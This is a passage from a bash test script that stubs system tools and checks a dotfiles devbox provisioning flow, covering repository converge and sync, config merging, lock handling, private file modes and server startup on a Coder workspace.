const path = require("node:path");
const stateDirectory = process.env.DOTFILES_TEST_STATE;
fs.appendFileSync(process.env.DOTFILES_TEST_LOG, `glimmervoid ${process.argv.slice(2).join(" ")}\n`);
if (process.argv[2] === "--version") {
  process.stdout.write(fs.readFileSync(path.join(stateDirectory, "glimmervoid-version")));
  process.exit(0);
}
fs.appendFileSync(process.env.DOTFILES_TEST_LOG, `glimmervoid-path ${process.env.PATH}\n`);
fs.writeFileSync(path.join(stateDirectory, "listening-3456"), "");
if (fs.existsSync(path.join(stateDirectory, "no-remote-listener"))) process.exit(0);
fs.writeFileSync(path.join(stateDirectory, "listening-3457"), "");
JS
chmod +x "$glimmervoidScriptPath"
ln -s "$glimmervoidScriptPath" "$stubBin/glimmervoid"
glimmervoidScriptPath="$(readlink -f "$glimmervoidScriptPath")"
writeStub codex <<'STUB'
#!/usr/bin/env bash
exit 0
STUB
writeStub bwrap <<'STUB'
#!/usr/bin/env bash
exit 0
STUB
writeStub socat <<'STUB'
#!/usr/bin/env bash
exit 0
STUB
for toolchainCommand in ruby java mvn sqlite3 python3 biome tsc typescript-language-server; do
  printf '#!/usr/bin/env bash\nexit 0\n' | writeStub "$toolchainCommand"
done
writeStub npm <<'STUB'
#!/usr/bin/env bash
printf 'npm %s\n' "$*" >> "$DOTFILES_TEST_LOG"
if [[ "$1" == view ]]; then
  [[ "$2" != glimmervoid@latest ]] || { printf '0.29.1\n'; exit 0; }
  printf '%s\n' "${2#glimmervoid@}"
  exit 0
fi
case "$*" in
  *glimmervoid@*)
    [[ ! -f "$DOTFILES_TEST_STATE/npm-install-failed" ]] || exit 1
    printf '%s\n' "${!#}" | sed 's/^glimmervoid@//' > "$DOTFILES_TEST_STATE/glimmervoid-version"
    ;;
  *@openai/codex*) cp "$DOTFILES_TEST_STATE/available/codex" "$DOTFILES_TEST_STUB_BIN/codex" ;;
  *typescript-language-server*)
    for npmCommand in biome tsc typescript-language-server; do
      cp "$DOTFILES_TEST_STATE/available/$npmCommand" "$DOTFILES_TEST_STUB_BIN/$npmCommand"
    done
    ;;
  *) exit 1 ;;
esac
STUB
writeStub apt-get <<'STUB'
#!/usr/bin/env bash
printf 'apt-get %s\n' "$*" >> "$DOTFILES_TEST_LOG"
case "$*" in
  *bubblewrap*)
    [[ ! -f "$DOTFILES_TEST_STATE/sandbox-install-failed" ]] || exit 1
    cp "$DOTFILES_TEST_STATE/available/bwrap" "$DOTFILES_TEST_STUB_BIN/bwrap"
    ;;
  *socat*) cp "$DOTFILES_TEST_STATE/available/socat" "$DOTFILES_TEST_STUB_BIN/socat" ;;
  *maven*)
    for aptCommand in ruby java mvn sqlite3 python3; do
      cp "$DOTFILES_TEST_STATE/available/$aptCommand" "$DOTFILES_TEST_STUB_BIN/$aptCommand"
    done
    ;;
  *" git") printf '2.55.0\n' > "$DOTFILES_TEST_STATE/git-version" ;;
esac
STUB
writeStub add-apt-repository <<'STUB'
#!/usr/bin/env bash
printf 'add-apt-repository %s\n' "$*" >> "$DOTFILES_TEST_LOG"
STUB
writeStub setsid <<'STUB'
#!/usr/bin/env bash
printf 'setsid %s\n' "$*" >> "$DOTFILES_TEST_LOG"
if [[ -e /dev/fd/9 ]]; then touch "$DOTFILES_TEST_STATE/server-inherited-lock"; fi
umask > "$DOTFILES_TEST_STATE/umask-at-start"
cp "$HOME/.glimmervoid/config.json" "$DOTFILES_TEST_STATE/config-at-start"
exec "$@"
STUB
writeContainedSudoStub
writeStub uname <<'STUB'
#!/usr/bin/env bash
printf 'x86_64\n'
STUB
for stubName in node npm apt-get add-apt-repository setsid uname; do
  provideCommand "$stubName"
done
writeStub crontab <<'STUB'
#!/usr/bin/env bash
case "$1" in
  -l) [[ -f "$DOTFILES_TEST_STATE/crontab" ]] && cat "$DOTFILES_TEST_STATE/crontab" ;;
  -) cat > "$DOTFILES_TEST_STATE/crontab" ;;
  *) exit 1 ;;
esac
STUB
provideCommand crontab

instrumentedProvisionPath="$stubState/provision-with-test-listeners.sh"
hasProcCommandLines=0
if [[ -r /proc/self/cmdline ]]; then hasProcCommandLines=1; fi
awk -v hasProcCommandLines="$hasProcCommandLines" '
  $0 == "case \"$devboxAction\" in" {
    print "devboxPortListens() { [[ -f \"$DOTFILES_TEST_STATE/listening-$1\" ]]; }"
    if (hasProcCommandLines == 0) print "devboxProcessCommandLine() { ps -o args= -p \"$1\"; }"
  }
  { print }
' "$repoRoot/profiles/work/devbox/provision.sh" > "$instrumentedProvisionPath"

runRemoteProvision() {
  if [[ "${1:-provision}" == provision ]]; then
    runInStubbedSandbox "$sandbox" CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_NAME=devbox-fixture \
      CODER_WORKSPACE_OWNER_NAME=fixture bash "$instrumentedProvisionPath" prepare "$workspaceDomain" || return
  fi
  runInStubbedSandbox "$sandbox" CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_NAME=devbox-fixture \
    CODER_WORKSPACE_OWNER_NAME=fixture bash "$instrumentedProvisionPath" "${1:-provision}" "$workspaceDomain"
}

runRemoteProvisionWithoutWorkspaceName() {
  runInStubbedSandbox "$sandbox" CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_OWNER_NAME=fixture \
    env -u CODER_WORKSPACE_NAME bash "$instrumentedProvisionPath" "${1:-provision}" "$workspaceDomain"
}

printf '0.29.1\n' > "$stubState/glimmervoid-version"

remoteHome="$stubState/remote-home"
remoteClone="$remoteHome/Projects/dotfiles"
remoteConvergedRecord="$remoteHome/.local/state/dotfiles/converged"
remoteBootstrapLog="$remoteHome/.local/state/dotfiles/devbox-bootstrap.log"
cp "$repoRoot/profiles/work/devbox/provision.sh" "$stubState/remote-provision.sh"
printf 'running\n' > "$stubState/workspace-status"

startEmptyRemoteHome() {
  rm -rf "$remoteHome"
  mkdir -p "$remoteHome"
  touch "$remoteHome/.dotfiles-test-sandbox"
}

remoteAliasResolvesToClone() {
  [[ -L "$remoteHome/.dotfiles" && "$(cd -- "$remoteHome/.dotfiles" && pwd -P)" == "$(cd -- "$remoteClone" && pwd -P)" ]]
}

remoteConvergeRecordIsCleanAt() {
  [[ "$(awk '{ print $1, $4 }' "$remoteConvergedRecord" 2>/dev/null)" == "$1 clean" ]]
}

firstLineNumberMatching() {
  grep -nE -- "$1" "$commandLog" | head -1 | cut -d: -f1
}

linesAppearInOrder() {
  local previousLine=0 lineNumber linePattern
  for linePattern in "$@"; do
    lineNumber="$(firstLineNumberMatching "$linePattern")"
    [[ -n "$lineNumber" ]] && ((lineNumber > previousLine)) || return 1
    previousLine="$lineNumber"
  done
}

remoteConvergeSitsBetweenPrepareAndProvision() {
  linesAppearInOrder "^coder ssh .* prepare $workspaceDomain$" "^coder ssh .* dotfiles $workspaceDomain$" \
    "^coder ssh .* provision $workspaceDomain$"
}

startEmptyRemoteHome
touch "$stubState/execute-dotfiles" "$stubState/bootstrap-failed"
: > "$commandLog"
firstFailedConvergeStatus=0
firstFailedConvergeOutput="$(runDevbox ensure 2>&1)" || firstFailedConvergeStatus=$?
check "a failed first converge leaves ensure succeeding on its provision" test "$firstFailedConvergeStatus" -eq 0
check "a failed first converge reports dotfiles warned" outputHas "$firstFailedConvergeOutput" '[warned] dotfiles'
check "a failed first converge still provisions after it" remoteConvergeSitsBetweenPrepareAndProvision
check "a fresh box clones the dotfiles repository into Projects" \
  logHas "git clone --quiet -- https://github.com/johncwaters/dotfiles.git $remoteClone"
check "a fresh box points the dotfiles alias at the clone" remoteAliasResolvesToClone
check "a failed converge skips the repository sync" logLacks 'sync-repos'
: > "$commandLog"
runDevbox ensure >/dev/null 2>&1
check "the ensure after a failed first converge bootstraps again" logHas 'bootstrap work-server'
check "the ensure after a failed first converge reuses the clone" logLacks 'git clone --quiet -- https://github.com/johncwaters/dotfiles.git'

startEmptyRemoteHome
mkdir -p "$remoteHome/dotfiles-snapshot/script" "$remoteHome/dotfiles-snapshot.old" "$remoteHome/dotfiles-snapshot.new" "${remoteConvergedRecord%/*}"
touch "$remoteHome/dotfiles-snapshot/script/bootstrap"
ln -s "$remoteHome/dotfiles-snapshot" "$remoteHome/.dotfiles"
printf 'unknown work-server 2026-10-08T00:00:00Z clean\n' > "$remoteConvergedRecord"
printf 'Coder PATH setup\n' > "$remoteHome/.bashrc"
: > "$commandLog"
failedSnapshotBoxStatus=0
failedSnapshotBoxOutput="$(runDevbox ensure 2>&1)" || failedSnapshotBoxStatus=$?
check "a failed converge over a snapshot box leaves ensure succeeding" test "$failedSnapshotBoxStatus" -eq 0
check "a failed converge over a snapshot box reports dotfiles warned" outputHas "$failedSnapshotBoxOutput" '[warned] dotfiles'
check "a snapshot box repoints the dotfiles alias at the clone" remoteAliasResolvesToClone
check "a failed converge keeps every retired snapshot directory" \
  bash -c '[[ -d "$1/dotfiles-snapshot" && -d "$1/dotfiles-snapshot.new" && -d "$1/dotfiles-snapshot.old" ]]' _ "$remoteHome"
check "the box converge holds the provision lock" logHas 'flock -w 120 9'
check "bootstrap failure evidence is in the private log" grep -q 'converge-probe.*install.sh exited 1' "$remoteBootstrapLog"
check "bootstrap log has mode 0600" test "$(fileModeOf "$remoteBootstrapLog")" = 600
: > "$commandLog"
failedBoxConvergeStatus=0
failedBoxConvergeOutput="$(runInstall 2>&1)" || failedBoxConvergeStatus=$?
check "a failed box converge maps to a laptop converge warning" outputHas "$failedBoxConvergeOutput" '[warn] devbox'
check "a failed box converge fails laptop converge" test "$failedBoxConvergeStatus" -eq 1
touch "$stubState/provision-lock-held"
: > "$commandLog"
heldLockOutput="$(runDevbox ensure 2>&1)"
check "a held provision lock reports dotfiles warned" outputHas "$heldLockOutput" '[warned] dotfiles: box converge did not finish'
check "a held provision lock runs no bootstrap" logLacks 'bootstrap work-server'
rm -f "$stubState/provision-lock-held" "$stubState/bootstrap-failed"
rm -rf "$remoteClone"
: > "$commandLog"
convergedOutput="$(runDevbox ensure)"
check "a clean converge reports dotfiles installed" outputHas "$convergedOutput" '[installed] dotfiles'
check "a snapshot box clones, bootstraps, then syncs repositories before provision" \
  linesAppearInOrder '^git clone .*johncwaters/dotfiles\.git' '^bootstrap work-server$' \
    "^coder ssh .* sync-repos $workspaceDomain$" "^coder ssh .* provision $workspaceDomain$"
check "a clean converge removes every retired snapshot directory" \
  bash -c '[[ ! -e "$1/dotfiles-snapshot" && ! -e "$1/dotfiles-snapshot.new" && ! -e "$1/dotfiles-snapshot.old" ]]' _ "$remoteHome"
check "a clean converge reports the retired snapshot removed" outputHas "$convergedOutput" '[installed] dotfiles snapshot: removed ~/dotfiles-snapshot'
check "the converge records the clone HEAD as clean" \
  remoteConvergeRecordIsCleanAt "$("$testGitPath" -C "$dotfilesOriginRepo" rev-parse HEAD)"
check "the converge makes lasting links through the alias" grep -qx 'committed hook' "$remoteHome/.claude/hooks/converge-probe.mjs"
check "the converge preserves Coder shell setup" grep -qx 'Coder PATH setup' "$remoteHome/.bashrc"
check "the converge includes Coder and local commands on PATH" \
  grep -qF "/tmp/coder-script-data/bin:$remoteHome/.local/bin:" "$stubState/bootstrap-path"
: > "$commandLog"
currentOutput="$(runDevbox ensure)"
check "the next ensure reports converged dotfiles present" outputHas "$currentOutput" '[present] dotfiles'
check "the next ensure does not bootstrap" logLacks 'bootstrap work-server'
printf 'updated hook\n' > "$dotfilesOriginRepo/converge-probe/hook.mjs"
commitDotfilesOrigin update
: > "$commandLog"
updatedOutput="$(runDevbox ensure)"
check "a new mainline commit is pulled and converged" outputHas "$updatedOutput" '[installed] dotfiles'
check "the pulled commit is live through the alias" grep -qx 'updated hook' "$remoteHome/.claude/hooks/converge-probe.mjs"
"$testGitPath" -C "$remoteClone" checkout -q -b box-feature
: > "$commandLog"
featureBranchOutput="$(runDevbox ensure 2>&1)"
check "a clone off mainline reports dotfiles warned" outputHas "$featureBranchOutput" '[warned] dotfiles'
check "a clone off mainline is never bootstrapped" logLacks 'bootstrap work-server'
check "the mainline guard names the branch in the bootstrap log" grep -qF 'is on box-feature, not main' "$remoteBootstrapLog"
check "a refused converge keeps the last converge record" \
  remoteConvergeRecordIsCleanAt "$("$testGitPath" -C "$dotfilesOriginRepo" rev-parse HEAD)"
"$testGitPath" -C "$remoteClone" checkout -q main
check "every automated SSH disables autostart and the CLI usage report" \
  bash -c '! grep -vx "true disable" "$1"' _ "$stubState/ssh-safety"

rm -rf "$dotfilesOriginRepo"
mkdir -p "$dotfilesOriginRepo"
cp -R "$repoRoot/." "$dotfilesOriginRepo"
rm -rf "$dotfilesOriginRepo/.git"
"$testGitPath" -C "$dotfilesOriginRepo" init -q -b main
commitDotfilesOrigin work-server
"$testGitPath" -C "$dotfilesOriginRepo" rev-parse HEAD > "$stubState/work-server-commit"
startEmptyRemoteHome
remoteLocalBin="$remoteHome/.local/bin"
mkdir -p "$remoteHome/posthog"
"$testGitPath" -C "$remoteHome/posthog" init -q -b main
"$testGitPath" -C "$remoteHome/posthog" remote add origin https://github.com/PostHog/posthog
printf 'template checkout\n' > "$remoteHome/posthog/template-owned"
touch "$stubState/execute-config"
mkdir -p "$remoteLocalBin"
ln -s "$BASH" "$remoteLocalBin/bash"
cat > "$remoteLocalBin/claude" <<'STUB'
#!/usr/bin/env bash
printf 'claude %s\n' "$*" >> "$DOTFILES_TEST_LOG"
STUB
cp "$repoRoot/test/fixtures/codex-mcp.cjs" "$remoteLocalBin/codex"
chmod +x "$remoteLocalBin/codex"
export CODEX_MCP_COMMAND_LOG="$commandLog"
cat > "$remoteLocalBin/npm" <<'STUB'
#!/usr/bin/env bash
printf 'npm %s in %s\n' "$*" "$PWD" >> "$DOTFILES_TEST_LOG"
mkdir -p node_modules/.bin
printf '{}\n' > node_modules/.package-lock.json
printf '#!/usr/bin/env bash\nprintf "playwright-core %%s\\n" "$*" >> "$DOTFILES_TEST_LOG"\n' > node_modules/.bin/playwright-core
chmod +x node_modules/.bin/playwright-core
STUB
chmod +x "$remoteLocalBin/claude" "$remoteLocalBin/npm"
cat > "$remoteHome/.gitconfig" <<'GITCONFIG'
[user]
	name = Devbox Author
	email = devbox@example.invalid
GITCONFIG
: > "$commandLog"
workServerConvergeStatus=0
workServerConvergeOutput="$(runDevbox ensure 2>&1)" || workServerConvergeStatus=$?
check "the real work-server profile bootstraps a fresh box through ensure" test "$workServerConvergeStatus" -eq 0
check "the fresh work-server converge waits for Codex hook trust" \
  grep -qF 'open codex, review hooks with /hooks' "$remoteBootstrapLog"
check "untrusted confinement reports dotfiles warned" outputHas "$workServerConvergeOutput" '[warned] dotfiles: work-server converge warned'
check "fresh work-server keeps Codex backchannels disabled" \
  grep -qF 'enabled = false' "$remoteHome/.codex/config.toml"
node - "$remoteHome" <<'NODE'
const fs = require('node:fs');
const home = process.argv[2];
const baseline = fs.readFileSync(`${home}/.local/state/dotfiles/ai-codex-hook-trust-baseline`, 'utf8').trimEnd().split('\n');
for (const entry of baseline.slice(1)) {
  const stateKey = entry.split('\t')[0];
  fs.appendFileSync(`${home}/.codex/config.toml`, `\n[hooks.state.${JSON.stringify(stateKey)}]\ntrusted_hash = "sha256:fixture-approved"\n`);
}
NODE
: > "$remoteBootstrapLog"
workServerConvergeOutput="$(runDevbox ensure 2>&1)"
check "trusted work-server confinement converges with zero warnings" \
  bash -c '[[ -s "$2" ]] && ! grep -qF "[warn" <<< "$1" && ! grep -qF "[warn]" "$2"' _ "$workServerConvergeOutput" "$remoteBootstrapLog"
check "the real work-server bootstrap resolves npm on the box rather than the test host" logHas 'npm ci --omit=dev in '
check "the real work-server converge records the clone HEAD as clean" \
  remoteConvergeRecordIsCleanAt "$(cat "$stubState/work-server-commit")"
while IFS= read -r declaredRepoEntry; do
  declaredRepoPath="${declaredRepoEntry%%=*}"
  declaredRepoUrl="${declaredRepoEntry#*=}"
  declaredRepoUrl="${declaredRepoUrl%% *}"
  check "work-server has $declaredRepoPath under the remote home" test -d "$remoteHome/$declaredRepoPath/.git"
  check "work-server $declaredRepoPath has the declared HTTPS origin" \
    test "$("$testGitPath" -C "$remoteHome/$declaredRepoPath" remote get-url origin)" = "$declaredRepoUrl"
done < "$repoRoot/profiles/work-server/repos.txt"
check "work-server links the template checkout into Projects" \
  test "$(readlink "$remoteHome/Projects/posthog")" = "$remoteHome/posthog"
check "work-server preserves the template-owned checkout" \
  grep -qx 'template checkout' "$remoteHome/posthog/template-owned"
check "work-server never re-clones the template checkout" logLacks 'git clone -q -- https://github.com/PostHog/posthog '
check "work-server never syncs the template checkout through its link" \
  logLacks "git -C $remoteHome/Projects/posthog "
check "work-server never syncs the template checkout" logLacks "git -C $remoteHome/posthog "
check "work-server nodeps entries never install repository dependencies" \
  bash -c '! grep -E "^npm .* in $1/Projects/" "$2"' _ "$remoteHome" "$commandLog"
check "work-server needs no gh authentication" logLacks 'gh api '
: > "$commandLog"
matchingWorkServerOutput="$(runDevbox ensure 2>&1)"
check "a converged work-server box still syncs its repositories" \
  logHas "git -C $remoteHome/Projects/glimmervoid pull --ff-only -q"
check "a converged work-server box never repeats AI bootstrap" logLacks 'npm ci '
check "a converged work-server box reports repository sync" outputHas "$matchingWorkServerOutput" '[present] repos: synced'
check "a converged work-server box never syncs the template checkout" \
  bash -c '! grep -qE "^git -C $1/(Projects/)?posthog " "$2"' _ "$remoteHome" "$commandLog"
check "the repository sync log is private" test "$(fileModeOf "$remoteHome/.local/state/dotfiles/devbox-repos.log")" = 600
: > "$commandLog"
rm -f "$remoteConvergedRecord"
: > "$remoteBootstrapLog"
forcedConvergeStatus=0
runDevbox ensure > /dev/null 2>&1 || forcedConvergeStatus=$?
check "a forced work-server converge exits cleanly" test "$forcedConvergeStatus" -eq 0
check "a forced work-server converge records the clone HEAD as clean" \
  remoteConvergeRecordIsCleanAt "$(cat "$stubState/work-server-commit")"
check "every hook script the real work-server settings run exists on the box" \
  node -e '
const settings = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
const hookScriptPaths = Object.values(settings.hooks).flat().flatMap(entry => entry.hooks)
  .map(hook => hook.command.match(/^node (\S+\.mjs)/)?.[1]).filter(Boolean);
const missingScriptPaths = hookScriptPaths.filter(scriptPath => !require("fs").existsSync(scriptPath));
if (hookScriptPaths.length === 0 || missingScriptPaths.length > 0) { console.error(missingScriptPaths); process.exit(1); }
' "$remoteHome/.claude/settings.json"
check "work-server provisioning converges the Projects repository root" \
  "$testNodePath" -e 'require("node:assert/strict").deepEqual(require(process.argv[1]).repoRoots, [require("node:path").join(process.argv[2], "Projects")])' \
  "$remoteHome/.glimmervoid/config.json" "$remoteHome"
check "the real work-server converge runs between prepare and provision" remoteConvergeSitsBetweenPrepareAndProvision
rm -f "$remoteConvergedRecord"
rm -rf "$remoteHome/Projects/glimmervoid"
touch "$stubState/clone-failed"
: > "$remoteBootstrapLog"
failedCloneOutput="$(runDevbox ensure 2>&1)"
check "a repository clone failure after a fresh converge warns in the repository sync" \
  outputHas "$failedCloneOutput" '[warned] repos: sync failed'
check "a repository clone failure never blocks the dotfiles converge" remoteConvergeRecordIsCleanAt "$(cat "$stubState/work-server-commit")"
check "a clone failure stays out of the bootstrap log" bash -c '! grep -q "clone failed" "$1"' _ "$remoteBootstrapLog"
check "a clone failure still reaches provisioning" outputHas "$failedCloneOutput" '[present] config'
rm -f "$stubState/clone-failed"
"$testGitPath" -C "$remoteHome/Projects/wizard" checkout -q -b local-work
rm -f "$remoteConvergedRecord"
: > "$remoteBootstrapLog"
: > "$commandLog"
localBranchOutput="$(runDevbox ensure 2>&1)"
check "a local branch without upstream warns in the repository sync" \
  outputHas "$localBranchOutput" '[warned] repos: sync failed'
check "a local branch without upstream is named in the sync log" \
  grep -qF 'no upstream on local-work' "$remoteHome/.local/state/dotfiles/devbox-repos.log"
check "a local branch without upstream still records the converge" \
  remoteConvergeRecordIsCleanAt "$(cat "$stubState/work-server-commit")"
check "the sync after a fresh converge retries the failed clone" test -d "$remoteHome/Projects/glimmervoid/.git"
: > "$commandLog"
afterLocalBranchOutput="$(runDevbox ensure 2>&1)"
check "the ensure after a repository warning does not re-bootstrap" logLacks 'npm ci '
check "the ensure after a repository warning keeps dotfiles present" \
  outputHas "$afterLocalBranchOutput" '[present] dotfiles'
"$testGitPath" -C "$remoteHome/Projects/wizard" checkout -q main
rm -rf "$remoteHome/Projects/glimmervoid"
touch "$stubState/clone-failed"
failedMatchingSyncOutput="$(runDevbox ensure 2>&1)"
check "a converged box warns when a new repository clone fails" outputHas "$failedMatchingSyncOutput" '[warned] repos: sync failed'
rm -f "$stubState/clone-failed"
retriedMatchingSyncOutput="$(runDevbox ensure 2>&1)"
check "the next converged ensure retries the missing clone" test -d "$remoteHome/Projects/glimmervoid/.git"
check "the converged retry reports a successful sync" outputHas "$retriedMatchingSyncOutput" '[present] repos: synced'
rm "$remoteHome/Projects/posthog"
mkdir "$remoteHome/Projects/posthog"
printf 'keep this directory\n' > "$remoteHome/Projects/posthog/owner-edit"
rm -f "$remoteConvergedRecord"
runDevbox ensure >/dev/null 2>&1
check "an occupied PostHog project path is never replaced by a link" \
  grep -qx 'keep this directory' "$remoteHome/Projects/posthog/owner-edit"
rm -rf "$remoteHome/Projects/posthog"
ln -s "$remoteHome/missing-template" "$remoteHome/Projects/posthog"
runDevbox ensure >/dev/null 2>&1
check "an existing broken PostHog project link is never replaced" \
  test "$(readlink "$remoteHome/Projects/posthog")" = "$remoteHome/missing-template"
rm -f "$stubState/execute-dotfiles" "$stubState/execute-config"

rm "$sandbox/.dotfiles"
mkdir -p "$stubState/box-dotfiles"
ln -s "$stubState/box-dotfiles" "$sandbox/.dotfiles"

mergeConfig() {
  rm -f "$stubState/listening-3456" "$stubState/listening-3457" "$stubState/no-remote-listener"
  runInStubbedSandbox "$sandbox" CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_NAME=devbox-fixture \
    CODER_WORKSPACE_OWNER_NAME=fixture bash "$instrumentedProvisionPath" provision "$workspaceDomain"
}

mergeConfigWithoutWorkspaceName() {
  runInStubbedSandbox "$sandbox" CODER_WORKSPACE_AGENT_NAME=dev CODER_WORKSPACE_OWNER_NAME=fixture \
    env -u CODER_WORKSPACE_NAME bash "$instrumentedProvisionPath" provision "$workspaceDomain"
}

mkdir -p "$sandbox/.glimmervoid" "$sandbox/.dotfiles/glimmervoid" "$sandbox/.dotfiles/profiles/work"
cp "$repoRoot/glimmervoid/sync-settings.mjs" "$sandbox/.dotfiles/glimmervoid/"
cp "$repoRoot/glimmervoid/settings.json" "$sandbox/.dotfiles/glimmervoid/"
cat > "$sandbox/.glimmervoid/config.json" <<'JSON'
{"projects":[{"id":"existing","name":"kept","path":"/another/project"}],"sessions":[{"id":"active","transcript":"keep me"}],"unrelated":{"keep":true},"port":3000,"remote":{"ownerLogin":"retired"}}
JSON
cp "$sandbox/.glimmervoid/config.json" "$stubState/original-config"
mergeOutput="$(mergeConfig)"
check "config merge reports a change" outputHas "$mergeOutput" '[installed] config'
check "config merge has mode 0600" test "$(fileModeOf "$sandbox/.glimmervoid/config.json")" = 600
check "config merge preserves state and installs the requested remote settings" \
  "$testNodePath" - "$sandbox/.glimmervoid/config.json" "$sandbox" <<'JS'
const assert = require("node:assert/strict");
const config = require(process.argv[2]);
assert.deepEqual(config.sessions, [{id: "active", transcript: "keep me"}]);
assert.deepEqual(config.unrelated, {keep: true});
assert.equal(config.projects[0].path, "/another/project");
assert.equal(config.projects[1].id, "bcea0337-5a86-4f96-beb3-ea0ea1fcdcf7");
assert.equal(config.port, 3456);
assert.equal(config.checkForUpdates, undefined);
assert.deepEqual(config.repoRoots, [require("node:path").join(process.argv[3], "Projects")]);
assert.deepEqual(config.remote, {enabled: true, port: 3457, publicHost: "3457--dev--devbox-fixture--fixture.coder.dev.posthog.dev", allowedOrigins: ["https://3457--dev--devbox-fixture--fixture.coder.dev.posthog.dev"]});
assert.equal(config.coder, undefined);
JS
backups=("$sandbox/.glimmervoid"/config.json.*.bak)
check "config merge backs up the original bytes" cmp -s "$stubState/original-config" "${backups[0]}"
check "config backup has mode 0600" test "$(fileModeOf "${backups[0]}")" = 600
check "provision waits a bounded time for the provision lock" grep -qx 'flock -w 120 9' "$commandLog"
cp "$sandbox/.glimmervoid/config.json" "$stubState/config-before-held-lock"
touch "$stubState/provision-lock-held"
heldLockMergeStatus=0
heldLockMergeOutput="$(mergeConfig)" || heldLockMergeStatus=$?
check "provision refuses while another run holds the provision lock" test "$heldLockMergeStatus" -ne 0
check "provision names the run holding the provision lock" \
  outputHas "$heldLockMergeOutput" '[warned] provision: another run is in progress'
check "provision under a held lock keeps the config bytes" \
  cmp -s "$stubState/config-before-held-lock" "$sandbox/.glimmervoid/config.json"
rm -f "$stubState/provision-lock-held"
secondMergeOutput="$(mergeConfig)"
check "second config merge reports present" outputHas "$secondMergeOutput" '[present] config'
check "second config merge does not duplicate projects" \
  "$testNodePath" -e 'const config=require(process.argv[1]);process.exit(config.projects.filter((project)=>project.path==="/home/coder/posthog").length===1?0:1)' "$sandbox/.glimmervoid/config.json"
secondBackups=("$sandbox/.glimmervoid"/config.json.*.bak)
check "unchanged merge creates no new backup" test "${#secondBackups[@]}" -eq 1
cp "$sandbox/.glimmervoid/config.json" "$stubState/config-before-missing-host"
missingHostMergeStatus=0
mergeConfigWithoutWorkspaceName >/dev/null 2>&1 || missingHostMergeStatus=$?
check "provision without a Coder workspace variable fails" test "$missingHostMergeStatus" -ne 0
check "provision without a Coder workspace variable keeps the config bytes" \
  cmp -s "$stubState/config-before-missing-host" "$sandbox/.glimmervoid/config.json"
missingHostBackups=("$sandbox/.glimmervoid"/config.json.*.bak)
check "provision without a Coder workspace variable writes no backup" test "${#missingHostBackups[@]}" -eq 1
"$testNodePath" -e '
  const fs = require("node:fs");
  const config = JSON.parse(fs.readFileSync(process.argv[1], "utf8"));
  const { sessions, ...rest } = config;
  fs.writeFileSync(process.argv[1], JSON.stringify({ sessions, ...rest }, null, 2));
' "$sandbox/.glimmervoid/config.json"
cp "$sandbox/.glimmervoid/config.json" "$stubState/server-saved-config"
serverSavedMergeOutput="$(mergeConfig)"
check "a server save without a trailing newline merges as present" outputHas "$serverSavedMergeOutput" '[present] config'
check "a server save without a trailing newline keeps its bytes" cmp -s "$stubState/server-saved-config" "$sandbox/.glimmervoid/config.json"
serverSavedBackups=("$sandbox/.glimmervoid"/config.json.*.bak)
check "a server save without a trailing newline creates no backup" test "${#serverSavedBackups[@]}" -eq 1
printf '{"projects":null,"sessions":["kept"]}\n' > "$sandbox/.glimmervoid/config.json"
mergeConfig >/dev/null
check "a non-array projects value becomes an array without losing sessions" \
  "$testNodePath" -e 'const config=require(process.argv[1]);process.exit(Array.isArray(config.projects)&&config.sessions[0]==="kept"?0:1)' "$sandbox/.glimmervoid/config.json"
printf 'invalid JSON\n' > "$sandbox/.glimmervoid/config.json"
invalidConfigStatus=0
mergeConfig >/dev/null 2>&1 || invalidConfigStatus=$?
check "invalid runtime config fails instead of being replaced" test "$invalidConfigStatus" -ne 0
check "invalid runtime config preserves its bytes" grep -qx 'invalid JSON' "$sandbox/.glimmervoid/config.json"

printf '0.28.0\n' > "$stubState/glimmervoid-version"
: > "$commandLog"
rm -f "$stubState/listening-3456" "$stubState/listening-3457" "$sandbox/.glimmervoid/config.json"
remoteOutput="$( (umask 022; runRemoteProvision) )"
check "remote provision installs the requested npm version under the box home" \
  logHas "npm install -g --prefix $sandbox/.local glimmervoid@0.29.1"
check "remote provision installs missing Codex under the box home" logHas "npm install -g --prefix $sandbox/.local @openai/codex"
check "remote provision installs both sandbox packages" bash -c 'grep -q bubblewrap "$1" && grep -q socat "$1"' _ "$commandLog"
check "remote provision detaches the CLI with nohup and its explicit config" \
  logHas "setsid nohup $stubBin/node $glimmervoidScriptPath --config $sandbox/.glimmervoid/config.json"
check "remote provision without a flox environment never calls flox" logLacks 'flox activate'
check "remote provision without a flox environment leaves PATH unchanged" \
  bash -c '! grep -E "^glimmervoid-path .*\.flox" "$1" >/dev/null' _ "$commandLog"
check "remote provision without flox does not report activation" outputLacks "$remoteOutput" 'flox env posthog'
check "remote provision waits for both listeners" outputHas "$remoteOutput" 'both listeners ready'
check "remote provision prints the forwarding URL" outputHas "$remoteOutput" 'https://3457--dev--devbox-fixture--fixture.coder.dev.posthog.dev/'
check "remote provision writes an executable gh wrapper" test -x "$sandbox/.local/bin/gh"
check "gh wrapper acquires external auth only when invoked" grep -qF 'coder external-auth access-token primary-github' "$sandbox/.local/bin/gh"
check "provisioning never acquires a GitHub token" logLacks 'external-auth'
check "server log has mode 0600" test "$(fileModeOf "$sandbox/.glimmervoid/server.log")" = 600
check "glimmervoid starts with the box umask rather than a private one" test "$(cat "$stubState/umask-at-start")" = 0022
check "provisioned config still has mode 0600 under the box umask" test "$(fileModeOf "$sandbox/.glimmervoid/config.json")" = 600
check "provision waits a bounded time for the provision lock" logHas 'flock -w 120 9'
check "the started server never holds the provision lock" test ! -e "$stubState/server-inherited-lock"

rm -f "$stubState/listening-3456" "$stubState/listening-3457"
printf '0.28.0\n' > "$stubState/glimmervoid-version"
touch "$stubState/provision-lock-held"
: > "$commandLog"
heldLockProvisionStatus=0
heldLockProvisionOutput="$(runRemoteProvision)" || heldLockProvisionStatus=$?
check "an overlapping provision fails" test "$heldLockProvisionStatus" -ne 0
check "an overlapping provision names the run in progress" \
  outputHas "$heldLockProvisionOutput" '[warned] provision: another run is in progress'
check "an overlapping provision installs nothing" logLacks 'npm install'
check "an overlapping provision installs no system package" logLacks 'apt-get'
check "an overlapping provision starts no server" logLacks 'setsid'
touch "$stubState/listening-3456" "$stubState/listening-3457"
: > "$commandLog"
heldLockStatusOutput="$(runRemoteProvision status)"
check "status reads the box while a provision holds the lock" outputHas "$heldLockStatusOutput" 'glimmervoid server'
